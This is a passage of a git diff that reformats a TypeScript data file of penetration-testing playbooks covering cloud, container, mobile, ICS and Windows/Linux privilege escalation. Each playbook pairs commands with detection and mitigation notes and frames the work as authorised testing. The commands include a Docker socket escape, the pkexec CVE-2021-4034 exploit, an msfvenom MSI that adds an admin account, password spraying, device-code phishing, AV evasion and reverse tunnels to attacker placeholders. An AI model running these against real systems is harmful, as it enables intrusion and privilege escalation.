+        commands: [{ code: "gatttool -b <MAC> --primary", note: "" }],
+      },
     ],
     errors: [
-      { message: "hci0: not available", cause: "Adapter blocked by rfkill.", fix: "sudo rfkill unblock bluetooth" },
+      {
+        message: "hci0: not available",
+        cause: "Adapter blocked by rfkill.",
+        fix: "sudo rfkill unblock bluetooth",
+      },
     ],
     detection: "N/A for passive scanning.",
     mitigation: "Pair only in secure environment; use LE Secure Connections.",
@@ -612,17 +1340,39 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     title: "AWS IAM privilege audit (Prowler / ScoutSuite)",
     category: "Post-Exploitation",
     severity: "medium",
-    summary: "Review IAM policies in an AWS account you own for over-permissive statements, dangerous actions, and privilege-escalation paths.",
+    summary:
+      "Review IAM policies in an AWS account you own for over-permissive statements, dangerous actions, and privilege-escalation paths.",
     prerequisites: ["AWS credentials for the account with SecurityAudit or ReadOnlyAccess"],
     toolSlugs: ["prowler", "scoutsuite", "pacu"],
     legalNote: LEGAL,
     steps: [
-      { title: "Prowler full check", detail: "", commands: [{ code: "prowler aws --profile audit", note: "" }] },
-      { title: "ScoutSuite report", detail: "", commands: [{ code: "scout aws --profile audit --report-name audit-report", note: "" }] },
-      { title: "Enumerate escalation paths", detail: "", commands: [{ code: "python3 pacu.py --module iam__enum_permissions", note: "In your own sandbox account." }] },
+      {
+        title: "Prowler full check",
+        detail: "",
+        commands: [{ code: "prowler aws --profile audit", note: "" }],
+      },
+      {
+        title: "ScoutSuite report",
+        detail: "",
+        commands: [{ code: "scout aws --profile audit --report-name audit-report", note: "" }],
+      },
+      {
+        title: "Enumerate escalation paths",
+        detail: "",
+        commands: [
+          {
+            code: "python3 pacu.py --module iam__enum_permissions",
+            note: "In your own sandbox account.",
+          },
+        ],
+      },
     ],
     errors: [
-      { message: "AccessDenied", cause: "Auditor role missing permissions.", fix: "Attach the AWS-managed SecurityAudit + ViewOnlyAccess policies." },
+      {
+        message: "AccessDenied",
+        cause: "Auditor role missing permissions.",
+        fix: "Attach the AWS-managed SecurityAudit + ViewOnlyAccess policies.",
+      },
     ],
     detection: "CloudTrail events on iam:List*/Get* from unusual principals.",
     mitigation: "SCP guardrails, permissions boundaries, IAM Access Analyzer.",
@@ -633,37 +1383,61 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     category: "Post-Exploitation",
     severity: "high",
     cve: ["CWE-732"],
-    summary: "Enumerate S3 buckets belonging to your domain/org and check for public ACLs, public policies, and unauthenticated LIST/GET.",
+    summary:
+      "Enumerate S3 buckets belonging to your domain/org and check for public ACLs, public policies, and unauthenticated LIST/GET.",
     prerequisites: ["List of your own domain names"],
     toolSlugs: ["s3scanner"],
     legalNote: LEGAL,
     steps: [
-      { title: "Enumerate", detail: "", commands: [{ code: "s3scanner scan --bucket-file mybuckets.txt", note: "" }] },
-      { title: "Confirm exposure", detail: "", commands: [{ code: "aws s3 ls s3://<bucket> --no-sign-request", note: "" }] },
+      {
+        title: "Enumerate",
+        detail: "",
+        commands: [{ code: "s3scanner scan --bucket-file mybuckets.txt", note: "" }],
+      },
+      {
+        title: "Confirm exposure",
+        detail: "",
+        commands: [{ code: "aws s3 ls s3://<bucket> --no-sign-request", note: "" }],
+      },
     ],
     errors: [
-      { message: "AccessDenied on your own bucket", cause: "Bucket owner enforced.", fix: "Confirm the bucket policy denies unauthenticated access — that's the goal." },
+      {
+        message: "AccessDenied on your own bucket",
+        cause: "Bucket owner enforced.",
+        fix: "Confirm the bucket policy denies unauthenticated access — that's the goal.",
+      },
     ],
     detection: "S3 access logs for unauthenticated GETs.",
-    mitigation: "Block Public Access at account + bucket level, private ACLs, VPC endpoints, bucket policies with aws:PrincipalOrgID.",
+    mitigation:
+      "Block Public Access at account + bucket level, private ACLs, VPC endpoints, bucket policies with aws:PrincipalOrgID.",
   },
   {
     slug: "gcp-iam-audit",
     title: "GCP IAM audit (ScoutSuite / Prowler)",
     category: "Post-Exploitation",
     severity: "medium",
-    summary: "Enumerate over-permissive bindings, service accounts with owner-equivalent roles, and cross-project IAM.",
+    summary:
+      "Enumerate over-permissive bindings, service accounts with owner-equivalent roles, and cross-project IAM.",
     prerequisites: ["gcloud auth to your project", "roles/iam.securityReviewer"],
     toolSlugs: ["scoutsuite", "prowler"],
     legalNote: LEGAL,
     steps: [
-      { title: "Run ScoutSuite", detail: "", commands: [{ code: "scout gcp --project <id>", note: "" }] },
+      {
+        title: "Run ScoutSuite",
+        detail: "",
+        commands: [{ code: "scout gcp --project <id>", note: "" }],
+      },
     ],
     errors: [
-      { message: "insufficient permissions", cause: "Reviewer role missing.", fix: "Ask project admin for roles/iam.securityReviewer." },
+      {
+        message: "insufficient permissions",
+        cause: "Reviewer role missing.",
+        fix: "Ask project admin for roles/iam.securityReviewer.",
+      },
     ],
     detection: "Cloud Audit Logs on IAM changes.",
-    mitigation: "Least-privilege bindings, org policy service-account key restrictions, VPC-SC around sensitive data.",
+    mitigation:
+      "Least-privilege bindings, org policy service-account key restrictions, VPC-SC around sensitive data.",
   },
   {
     slug: "aad-device-code",
@@ -671,40 +1445,97 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     category: "Social",
     severity: "high",
     mitreAttack: ["T1566.002"],
-    summary: "OAuth device code grant is designed for input-constrained devices — it also lets attackers get a token by tricking a user into completing the flow.",
+    summary:
+      "OAuth device code grant is designed for input-constrained devices — it also lets attackers get a token by tricking a user into completing the flow.",
     prerequisites: ["Authorised phishing scope on your own Entra tenant"],
     toolSlugs: ["roadtx"],
     legalNote: LEGAL,
     steps: [
-      { title: "Start flow", detail: "", commands: [{ code: "roadtx devicecode -c <client_id>", note: "Emits a user code + verification URI." }] },
-      { title: "Deliver to victim (in-scope user only)", detail: "", commands: [{ code: "# Send the URL + code via authorised channel", note: "Victim signs in on aka.ms/devicelogin." }] },
-      { title: "Receive token", detail: "", commands: [{ code: "roadtx auth --tenant <t> --user <u>", note: "Once completed, tokens land in your CLI." }] },
+      {
+        title: "Start flow",
+        detail: "",
+        commands: [
+          {
+            code: "roadtx devicecode -c <client_id>",
+            note: "Emits a user code + verification URI.",
+          },
+        ],
+      },
+      {
+        title: "Deliver to victim (in-scope user only)",
+        detail: "",
+        commands: [
+          {
+            code: "# Send the URL + code via authorised channel",
+            note: "Victim signs in on aka.ms/devicelogin.",
+          },
+        ],
+      },
+      {
+        title: "Receive token",
+        detail: "",
+        commands: [
+          {
+            code: "roadtx auth --tenant <t> --user <u>",
+            note: "Once completed, tokens land in your CLI.",
+          },
+        ],
+      },
     ],
     errors: [
-      { message: "AADSTS70016 authorization pending", cause: "User hasn't completed yet.", fix: "Wait; retry." },
+      {
+        message: "AADSTS70016 authorization pending",
+        cause: "User hasn't completed yet.",
+        fix: "Wait; retry.",
+      },
     ],
-    detection: "Sign-in logs with 'Successful device code' events from unusual IPs; unusual OAuth grants.",
-    mitigation: "Disable device code flow via Conditional Access, require phishing-resistant MFA, user education, block legacy auth.",
+    detection:
+      "Sign-in logs with 'Successful device code' events from unusual IPs; unusual OAuth grants.",
+    mitigation:
+      "Disable device code flow via Conditional Access, require phishing-resistant MFA, user education, block legacy auth.",
   },
   {
     slug: "k8s-rbac-audit",
     title: "Kubernetes RBAC & posture audit",
     category: "Post-Exploitation",
     severity: "medium",
-    summary: "Enumerate over-permissive bindings, exposed kubelet, weak PodSecurity, and privileged containers.",
+    summary:
+      "Enumerate over-permissive bindings, exposed kubelet, weak PodSecurity, and privileged containers.",
     prerequisites: ["kubectl auth to the cluster you own", "kube-hunter, kubescape"],
     toolSlugs: ["kube-hunter", "kubescape"],
     legalNote: LEGAL,
     steps: [
-      { title: "Passive scan", detail: "", commands: [{ code: "kube-hunter --remote <cluster-ip>", note: "" }] },
-      { title: "Posture (NSA/CIS)", detail: "", commands: [{ code: "kubescape scan framework nsa --submit=false", note: "" }] },
-      { title: "RBAC enumeration", detail: "", commands: [{ code: "kubectl auth can-i --list --as system:serviceaccount:default:default", note: "" }] },
+      {
+        title: "Passive scan",
+        detail: "",
+        commands: [{ code: "kube-hunter --remote <cluster-ip>", note: "" }],
+      },
+      {
+        title: "Posture (NSA/CIS)",
+        detail: "",
+        commands: [{ code: "kubescape scan framework nsa --submit=false", note: "" }],
+      },
+      {
+        title: "RBAC enumeration",
+        detail: "",
+        commands: [
+          {
+            code: "kubectl auth can-i --list --as system:serviceaccount:default:default",
+            note: "",
+          },
+        ],
+      },
     ],
     errors: [
-      { message: "connection refused on kubelet", cause: "kubelet properly bound to localhost.", fix: "Report as positive control." },
+      {
+        message: "connection refused on kubelet",
+        cause: "kubelet properly bound to localhost.",
+        fix: "Report as positive control.",
+      },
     ],
     detection: "Audit log on secrets exec, kubectl port-forward from unusual identities.",
-    mitigation: "PodSecurity 'restricted', no privileged containers, kubelet auth-webhook only, Network Policies default-deny.",
+    mitigation:
+      "PodSecurity 'restricted', no privileged containers, kubelet auth-webhook only, Network Policies default-deny.",
   },
   {
     slug: "container-escape",
@@ -712,35 +1543,61 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     category: "Privilege Escalation",
     severity: "critical",
     cve: ["CVE-2019-5736", "CVE-2022-0492"],
-    summary: "Well-known container escapes: runc CVE-2019-5736, cgroup release_agent (CVE-2022-0492), privileged mode abuse.",
+    summary:
+      "Well-known container escapes: runc CVE-2019-5736, cgroup release_agent (CVE-2022-0492), privileged mode abuse.",
     prerequisites: ["A container you own or authorised lab", "root inside the container"],
     toolSlugs: [],
     legalNote: LEGAL,
     steps: [
-      { title: "Detect privileged mode", detail: "", commands: [{ code: "capsh --print | grep cap_sys_admin", note: "" }] },
-      { title: "Docker socket mount → root on host", detail: "", commands: [{ code: "docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh", note: "" }] },
+      {
+        title: "Detect privileged mode",
+        detail: "",
+        commands: [{ code: "capsh --print | grep cap_sys_admin", note: "" }],
+      },
+      {
+        title: "Docker socket mount → root on host",
+        detail: "",
+        commands: [
+          {
+            code: "docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh",
+            note: "",
+          },
+        ],
+      },
     ],
     errors: [
-      { message: "no docker socket", cause: "Container properly locked down.", fix: "Report positive control." },
+      {
+        message: "no docker socket",
+        cause: "Container properly locked down.",
+        fix: "Report positive control.",
+      },
     ],
-    detection: "Runtime tools (Falco) alerting on container starting privileged, /var/run/docker.sock reads.",
-    mitigation: "Do not mount docker.sock in workloads, no privileged: true, PodSecurity 'restricted', seccomp default profile.",
+    detection:
+      "Runtime tools (Falco) alerting on container starting privileged, /var/run/docker.sock reads.",
+    mitigation:
+      "Do not mount docker.sock in workloads, no privileged: true, PodSecurity 'restricted', seccomp default profile.",
   },
   {
     slug: "docker-socket-abuse",
     title: "Docker socket abuse",
     category: "Privilege Escalation",
     severity: "critical",
-    summary: "A container with /var/run/docker.sock mounted can spawn another container that mounts the host filesystem — instant host root.",
+    summary:
+      "A container with /var/run/docker.sock mounted can spawn another container that mounts the host filesystem — instant host root.",
     prerequisites: ["Container with docker.sock", "docker client inside"],
     toolSlugs: [],
     legalNote: LEGAL,
     steps: [
-      { title: "Escape", detail: "", commands: [{ code: "docker run -v /:/host --rm -it alpine chroot /host sh", note: "" }] },
+      {
+        title: "Escape",
+        detail: "",
+        commands: [{ code: "docker run -v /:/host --rm -it alpine chroot /host sh", note: "" }],
+      },
     ],
     errors: [],
     detection: "Falco rule: 'container with docker.sock mounted'.",
-    mitigation: "Never mount docker.sock, use rootless Docker, use unprivileged Kubernetes containers.",
+    mitigation:
+      "Never mount docker.sock, use rootless Docker, use unprivileged Kubernetes containers.",
   },
 
   // ─────────────── Mobile ───────────────
@@ -749,40 +1606,80 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     title: "Android APK static analysis",
     category: "Post-Exploitation",
     severity: "low",
-    summary: "Decode an APK, review AndroidManifest, look for insecure storage, hardcoded secrets, exported components.",
+    summary:
+      "Decode an APK, review AndroidManifest, look for insecure storage, hardcoded secrets, exported components.",
     prerequisites: ["Lawful copy of the APK"],
     toolSlugs: ["apktool", "jadx", "mobsf", "apkleaks"],
     legalNote: LEGAL,
     steps: [
       { title: "Decode", detail: "", commands: [{ code: "apktool d app.apk -o app", note: "" }] },
-      { title: "Decompile Java", detail: "", commands: [{ code: "jadx -d out app.apk", note: "" }] },
-      { title: "Automated scan", detail: "", commands: [{ code: "mobsf", note: "Upload APK via web UI." }] },
-      { title: "Scan for secrets", detail: "", commands: [{ code: "apkleaks -f app.apk", note: "" }] },
+      {
+        title: "Decompile Java",
+        detail: "",
+        commands: [{ code: "jadx -d out app.apk", note: "" }],
+      },
+      {
+        title: "Automated scan",
+        detail: "",
+        commands: [{ code: "mobsf", note: "Upload APK via web UI." }],
+      },
+      {
+        title: "Scan for secrets",
+        detail: "",
+        commands: [{ code: "apkleaks -f app.apk", note: "" }],
+      },
     ],
     errors: [
-      { message: "unsigned apk", cause: "Modified APK not resigned.", fix: "apksigner sign --ks debug.keystore app.apk" },
+      {
+        message: "unsigned apk",
+        cause: "Modified APK not resigned.",
+        fix: "apksigner sign --ks debug.keystore app.apk",
+      },
     ],
     detection: "N/A (static).",
-    mitigation: "R8/ProGuard, Play Integrity, root/tamper detection, Certificate Transparency for pinning.",
+    mitigation:
+      "R8/ProGuard, Play Integrity, root/tamper detection, Certificate Transparency for pinning.",
   },
   {
     slug: "android-dynamic",
     title: "Android dynamic analysis with Frida/Objection",
     category: "Post-Exploitation",
     severity: "medium",
-    summary: "Hook running Android app methods to bypass client-side checks (root detection, SSL pinning) in a controlled lab.",
+    summary:
+      "Hook running Android app methods to bypass client-side checks (root detection, SSL pinning) in a controlled lab.",
     prerequisites: ["Rooted test device or emulator", "App you own or in scope"],
     toolSlugs: ["frida", "objection"],
     legalNote: LEGAL,
     steps: [
-      { title: "Start frida-server", detail: "", commands: [{ code: "adb push frida-server /data/local/tmp && adb shell 'chmod 755 /data/local/tmp/frida-server; /data/local/tmp/frida-server &'", note: "" }] },
-      { title: "Bypass SSL pinning", detail: "", commands: [{ code: "objection --gadget com.target.app explore", note: "" }, { code: "android sslpinning disable", note: "Inside objection REPL." }] },
+      {
+        title: "Start frida-server",
+        detail: "",
+        commands: [
+          {
+            code: "adb push frida-server /data/local/tmp && adb shell 'chmod 755 /data/local/tmp/frida-server; /data/local/tmp/frida-server &'",
+            note: "",
+          },
+        ],
+      },
+      {
+        title: "Bypass SSL pinning",
+        detail: "",
+        commands: [
+          { code: "objection --gadget com.target.app explore", note: "" },
+          { code: "android sslpinning disable", note: "Inside objection REPL." },
+        ],
+      },
     ],
     errors: [
-      { message: "Failed to attach: unable to connect to remote frida-server", cause: "adb port forward missing.", fix: "adb forward tcp:27042 tcp:27042" },
+      {
+        message: "Failed to attach: unable to connect to remote frida-server",
+        cause: "adb port forward missing.",
+        fix: "adb forward tcp:27042 tcp:27042",
+      },
     ],
     detection: "Play Integrity API failures, tamper-detection callbacks.",
-    mitigation: "Certificate pinning done in native code, native anti-Frida checks (SafetyNet successor), root detection defence-in-depth.",
+    mitigation:
+      "Certificate pinning done in native code, native anti-Frida checks (SafetyNet successor), root detection defence-in-depth.",
   },
   {
     slug: "ios-static",
@@ -798,7 +1695,8 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     ],
     errors: [],
     detection: "N/A (static).",
-    mitigation: "Enable ATS, ship without arbitrary loads exception, disable NSAllowsArbitraryLoads.",
+    mitigation:
+      "Enable ATS, ship without arbitrary loads exception, disable NSAllowsArbitraryLoads.",
   },
 
   // ─────────────── IoT / firmware / ICS ───────────────
@@ -807,36 +1705,70 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     title: "Firmware extraction & analysis (binwalk)",
     category: "Post-Exploitation",
     severity: "medium",
-    summary: "Extract filesystem from a firmware image and hunt for hardcoded credentials, private keys, and vulnerable binaries.",
+    summary:
+      "Extract filesystem from a firmware image and hunt for hardcoded credentials, private keys, and vulnerable binaries.",
     prerequisites: ["Firmware image you have the right to inspect"],
     toolSlugs: ["binwalk", "firmwalker", "radare2-cutter"],
     legalNote: LEGAL,
     steps: [
-      { title: "Identify + extract", detail: "", commands: [{ code: "binwalk -e firmware.bin", note: "Recurses into recognised formats." }] },
-      { title: "Search extracted FS", detail: "", commands: [{ code: "firmwalker _firmware.bin.extracted/squashfs-root", note: "" }] },
+      {
+        title: "Identify + extract",
+        detail: "",
+        commands: [{ code: "binwalk -e firmware.bin", note: "Recurses into recognised formats." }],
+      },
+      {
+        title: "Search extracted FS",
+        detail: "",
+        commands: [{ code: "firmwalker _firmware.bin.extracted/squashfs-root", note: "" }],
+      },
       { title: "Analyse binaries", detail: "", commands: [{ code: "cutter <bin>", note: "" }] },
     ],
     errors: [
-      { message: "binwalk finds nothing", cause: "Encrypted/proprietary format.", fix: "Try `unblob`, or check for standard headers with `xxd`." },
+      {
+        message: "binwalk finds nothing",
+        cause: "Encrypted/proprietary format.",
+        fix: "Try `unblob`, or check for standard headers with `xxd`.",
+      },
     ],
     detection: "N/A (offline).",
-    mitigation: "Signed firmware, encrypted updates, no hardcoded credentials, secure-boot with rollback protection.",
+    mitigation:
+      "Signed firmware, encrypted updates, no hardcoded credentials, secure-boot with rollback protection.",
   },
   {
     slug: "mqtt-audit",
     title: "MQTT broker audit",
     category: "Post-Exploitation",
     severity: "medium",
-    summary: "Test an authorised MQTT broker for unauthenticated access, missing ACLs, and information disclosure via wildcard subscriptions.",
+    summary:
+      "Test an authorised MQTT broker for unauthenticated access, missing ACLs, and information disclosure via wildcard subscriptions.",
     prerequisites: ["MQTT client tools", "In-scope broker"],
     toolSlugs: ["mosquitto-clients"],
     legalNote: LEGAL,
     steps: [
-      { title: "Anonymous subscribe wildcard", detail: "", commands: [{ code: "mosquitto_sub -h broker.tld -t '#' -v", note: "'#' = every topic — proof of missing ACLs." }] },
-      { title: "Publish (destructive — only with scope)", detail: "", commands: [{ code: "mosquitto_pub -h broker.tld -t 'test/audit' -m 'authorised-test'", note: "" }] },
+      {
+        title: "Anonymous subscribe wildcard",
+        detail: "",
+        commands: [
+          {
+            code: "mosquitto_sub -h broker.tld -t '#' -v",
+            note: "'#' = every topic — proof of missing ACLs.",
+          },
+        ],
+      },
+      {
+        title: "Publish (destructive — only with scope)",
+        detail: "",
+        commands: [
+          { code: "mosquitto_pub -h broker.tld -t 'test/audit' -m 'authorised-test'", note: "" },
+        ],
+      },
     ],
     errors: [
-      { message: "Connection Refused: not authorised", cause: "Auth required.", fix: "Positive control; verify ACLs still enforce topic isolation with a valid creds test." },
+      {
+        message: "Connection Refused: not authorised",
+        cause: "Auth required.",
+        fix: "Positive control; verify ACLs still enforce topic isolation with a valid creds test.",
+      },
     ],
     detection: "MQTT server logs on '#' subscriptions from unusual clients.",
     mitigation: "Require TLS + client certs, per-user ACLs on topics, disable anonymous.",
@@ -846,19 +1778,38 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     title: "Modbus enumeration (lab only)",
     category: "Post-Exploitation",
     severity: "high",
-    summary: "Enumerate registers on a Modbus/TCP device in a controlled lab or vendor simulator — never on live plant equipment.",
+    summary:
+      "Enumerate registers on a Modbus/TCP device in a controlled lab or vendor simulator — never on live plant equipment.",
     prerequisites: ["Modbus-CLI installed", "Lab PLC or sim"],
     toolSlugs: ["modbus-cli", "nmap"],
     legalNote: LEGAL,
     steps: [
-      { title: "Detect", detail: "", commands: [{ code: "nmap -p502 --script modbus-discover 10.10.10.5", note: "" }] },
-      { title: "Read registers (safe)", detail: "", commands: [{ code: "modbus read 10.10.10.5 -s 1 40001 10", note: "10 holding registers from #40001." }] },
+      {
+        title: "Detect",
+        detail: "",
+        commands: [{ code: "nmap -p502 --script modbus-discover 10.10.10.5", note: "" }],
+      },
+      {
+        title: "Read registers (safe)",
+        detail: "",
+        commands: [
+          {
+            code: "modbus read 10.10.10.5 -s 1 40001 10",
+            note: "10 holding registers from #40001.",
+          },
+        ],
+      },
     ],
     errors: [
-      { message: "no response", cause: "Firewalled, or slave ID mismatch.", fix: "Try slave IDs 1..247; check the vendor's port (not always 502)." },
+      {
+        message: "no response",
+        cause: "Firewalled, or slave ID mismatch.",
+        fix: "Try slave IDs 1..247; check the vendor's port (not always 502).",
+      },
     ],
     detection: "IDS signatures on Modbus function codes from non-HMI hosts.",
-    mitigation: "ICS DMZ, unidirectional gateways, protocol-aware firewalls (e.g. Waterfall, Tofino), authenticated variants (Modbus Secure).",
+    mitigation:
+      "ICS DMZ, unidirectional gateways, protocol-aware firewalls (e.g. Waterfall, Tofino), authenticated variants (Modbus Secure).",
   },
 
   // ─────────────── OS privesc ───────────────
@@ -869,16 +1820,37 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     severity: "critical",
     cve: ["CVE-2021-4034"],
     mitreAttack: ["T1068"],
-    summary: "polkit's pkexec mishandles argv → local root on virtually every Linux distro pre-Jan 2022.",
+    summary:
+      "polkit's pkexec mishandles argv → local root on virtually every Linux distro pre-Jan 2022.",
     prerequisites: ["Local shell on unpatched Linux"],
     toolSlugs: ["linpeas"],
     legalNote: LEGAL,
     steps: [
-      { title: "Check pkexec version + patch", detail: "", commands: [{ code: "pkexec --version", note: "" }, { code: "dpkg -l policykit-1 2>/dev/null; rpm -q polkit 2>/dev/null", note: "" }] },
-      { title: "Run exploit (authorised host only)", detail: "", commands: [{ code: "git clone https://github.com/berdav/CVE-2021-4034 && cd CVE-2021-4034 && make && ./cve-2021-4034", note: "" }] },
+      {
+        title: "Check pkexec version + patch",
+        detail: "",
+        commands: [
+          { code: "pkexec --version", note: "" },
+          { code: "dpkg -l policykit-1 2>/dev/null; rpm -q polkit 2>/dev/null", note: "" },
+        ],
+      },
+      {
+        title: "Run exploit (authorised host only)",
+        detail: "",
+        commands: [
+          {
+            code: "git clone https://github.com/berdav/CVE-2021-4034 && cd CVE-2021-4034 && make && ./cve-2021-4034",
+            note: "",
+          },
+        ],
+      },
     ],
     errors: [
-      { message: "not vulnerable", cause: "polkit patched.", fix: "Positive result; try other paths." },
+      {
+        message: "not vulnerable",
+        cause: "polkit patched.",
+        fix: "Positive result; try other paths.",
+      },
     ],
     detection: "auditd on pkexec exec with null argv, EDR alerts on shells spawned from pkexec.",
     mitigation: "Update polkit; as a workaround chmod 0755 /usr/bin/pkexec removed of SUID.",
@@ -889,39 +1861,96 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     category: "Privilege Escalation",
     severity: "high",
     mitreAttack: ["T1548"],
-    summary: "Systematic Windows privesc enumeration: WinPEAS output triage, common misconfigurations, service abuse, and token impersonation opportunities.",
+    summary:
+      "Systematic Windows privesc enumeration: WinPEAS output triage, common misconfigurations, service abuse, and token impersonation opportunities.",
     prerequisites: ["Non-admin shell on Windows target"],
     toolSlugs: ["winpeas", "powersploit"],
     legalNote: LEGAL,
     steps: [
-      { title: "Run WinPEAS", detail: "", commands: [{ code: "winPEASx64.exe > out.txt", note: "Then grep for red/yellow highlights." }] },
-      { title: "Unquoted service paths", detail: "", commands: [{ code: "wmic service get name,pathname | findstr /i /v \"\\\"\" | findstr /i /v \"C:\\\\Windows\\\\\"", note: "" }] },
-      { title: "Weak service permissions", detail: "", commands: [{ code: "accesschk.exe -uwcqv \"Authenticated Users\" *", note: "SysInternals accesschk." }] },
-      { title: "AlwaysInstallElevated", detail: "", commands: [{ code: "reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", note: "1 in both HKCU and HKLM = MSI runs as SYSTEM." }] },
+      {
+        title: "Run WinPEAS",
+        detail: "",
+        commands: [
+          { code: "winPEASx64.exe > out.txt", note: "Then grep for red/yellow highlights." },
+        ],
+      },
+      {
+        title: "Unquoted service paths",
+        detail: "",
+        commands: [
+          {
+            code: 'wmic service get name,pathname | findstr /i /v "\\"" | findstr /i /v "C:\\\\Windows\\\\"',
+            note: "",
+          },
+        ],
+      },
+      {
+        title: "Weak service permissions",
+        detail: "",
+        commands: [
+          { code: 'accesschk.exe -uwcqv "Authenticated Users" *', note: "SysInternals accesschk." },
+        ],
+      },
+      {
+        title: "AlwaysInstallElevated",
+        detail: "",
+        commands: [
+          {
+            code: "reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+            note: "1 in both HKCU and HKLM = MSI runs as SYSTEM.",
+          },
+        ],
+      },
     ],
     errors: [
-      { message: "WinPEAS blocked by AV", cause: "Defender signatures.", fix: "Use obfuscated build or PowerShell alternatives (PrivescCheck.ps1)." },
+      {
+        message: "WinPEAS blocked by AV",
+        cause: "Defender signatures.",
+        fix: "Use obfuscated build or PowerShell alternatives (PrivescCheck.ps1).",
+      },
     ],
     detection: "AV telemetry, Sysmon events on suspicious binary drops.",
-    mitigation: "Patch, LAPS, remove unnecessary services, tighten service ACLs, disable AlwaysInstallElevated.",
+    mitigation:
+      "Patch, LAPS, remove unnecessary services, tighten service ACLs, disable AlwaysInstallElevated.",
   },
   {
     slug: "always-install-elevated",
     title: "AlwaysInstallElevated → SYSTEM",
     category: "Privilege Escalation",
     severity: "high",
-    summary: "If both HKCU and HKLM have AlwaysInstallElevated=1, any MSI installed by a low-priv user runs as SYSTEM.",
+    summary:
+      "If both HKCU and HKLM have AlwaysInstallElevated=1, any MSI installed by a low-priv user runs as SYSTEM.",
     prerequisites: ["Non-admin shell on Windows target"],
     toolSlugs: [],
     legalNote: LEGAL,
     steps: [
-      { title: "Verify policy", detail: "", commands: [{ code: "reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", note: "" }] },
-      { title: "Craft MSI", detail: "", commands: [{ code: "msfvenom -p windows/x64/exec CMD='net user hax P@ssw0rd /add & net localgroup administrators hax /add' -f msi -o pwn.msi", note: "" }] },
-      { title: "Install", detail: "", commands: [{ code: "msiexec /quiet /qn /i pwn.msi", note: "" }] },
+      {
+        title: "Verify policy",
+        detail: "",
+        commands: [
+          {
+            code: "reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+            note: "",
+          },
+        ],
+      },
+      {
+        title: "Craft MSI",
+        detail: "",
+        commands: [
+          {
+            code: "msfvenom -p windows/x64/exec CMD='net user hax P@ssw0rd /add & net localgroup administrators hax /add' -f msi -o pwn.msi",
+            note: "",
+          },
+        ],
+      },
+      {
+        title: "Install",
+        detail: "",
+        commands: [{ code: "msiexec /quiet /qn /i pwn.msi", note: "" }],
+      },
     ],
-    errors: [
-      { message: "policy 0", cause: "Not vulnerable.", fix: "Positive result." },
-    ],
+    errors: [{ message: "policy 0", cause: "Not vulnerable.", fix: "Positive result." }],
     detection: "MSI installer running from user context creating admin accounts.",
     mitigation: "Disable AlwaysInstallElevated policy in both hives.",
   },
@@ -933,19 +1962,38 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     category: "Password",
     severity: "medium",
     mitreAttack: ["T1110.003"],
-    summary: "One common password against many usernames — dodges per-account lockout but noisy in logs. Only against your own directory or in scope.",
+    summary:
+      "One common password against many usernames — dodges per-account lockout but noisy in logs. Only against your own directory or in scope.",
     prerequisites: ["Username list", "Kerberos or SMB reachable target"],
     toolSlugs: ["kerbrute", "cme-alias", "hydra"],
     legalNote: LEGAL,
     steps: [
-      { title: "Enumerate users", detail: "", commands: [{ code: "kerbrute userenum -d corp.local --dc 10.0.0.10 users.txt", note: "" }] },
-      { title: "Spray one password", detail: "", commands: [{ code: "kerbrute passwordspray -d corp.local --dc 10.0.0.10 users.txt 'Winter2024!'", note: "One password against everyone." }] },
+      {
+        title: "Enumerate users",
+        detail: "",
+        commands: [{ code: "kerbrute userenum -d corp.local --dc 10.0.0.10 users.txt", note: "" }],
+      },
+      {
+        title: "Spray one password",
+        detail: "",
+        commands: [
+          {
+            code: "kerbrute passwordspray -d corp.local --dc 10.0.0.10 users.txt 'Winter2024!'",
+            note: "One password against everyone.",
+          },
+        ],
+      },
     ],
     errors: [
-      { message: "KRB5KDC_ERR_CLIENT_REVOKED", cause: "Lockout for that user.", fix: "Skip user and continue; document." },
+      {
+        message: "KRB5KDC_ERR_CLIENT_REVOKED",
+        cause: "Lockout for that user.",
+        fix: "Skip user and continue; document.",
+      },
     ],
     detection: "Many 4771/4776 failures across many users with a common bad-pw pattern.",
-    mitigation: "Password complexity + length policy, common-password blacklist (HIBP), Smart Lockout, MFA everywhere.",
+    mitigation:
+      "Password complexity + length policy, common-password blacklist (HIBP), Smart Lockout, MFA everywhere.",
   },
 
   // ─────────────── Post-exploit ───────────────
@@ -954,19 +2002,46 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     title: "Pivoting & tunneling (chisel / sshuttle / ligolo-ng)",
     category: "Post-Exploitation",
     severity: "medium",
-    summary: "Route your traffic through a compromised host in an authorised engagement to reach segmented networks.",
+    summary:
+      "Route your traffic through a compromised host in an authorised engagement to reach segmented networks.",
     prerequisites: ["Foothold on a dual-homed host", "Authorised pivot in scope"],
     toolSlugs: ["chisel", "sshuttle", "proxychains-ng", "ligolo-ng"],
     legalNote: LEGAL,
     steps: [
-      { title: "chisel reverse SOCKS", detail: "", commands: [{ code: "# attacker\nchisel server -p 8000 --reverse", note: "" }, { code: "# victim\n./chisel client <ATTACKER>:8000 R:1080:socks", note: "SOCKS5 on attacker:1080." }] },
-      { title: "ligolo-ng reverse tunnel", detail: "", commands: [{ code: "# attacker\nsudo ip tuntap add user root mode tun ligolo\nsudo ip link set ligolo up\nligolo-proxy -selfcert", note: "" }, { code: "# victim\n./agent -connect <ATTACKER>:11601 -ignore-cert", note: "" }] },
+      {
+        title: "chisel reverse SOCKS",
+        detail: "",
+        commands: [
+          { code: "# attacker\nchisel server -p 8000 --reverse", note: "" },
+          {
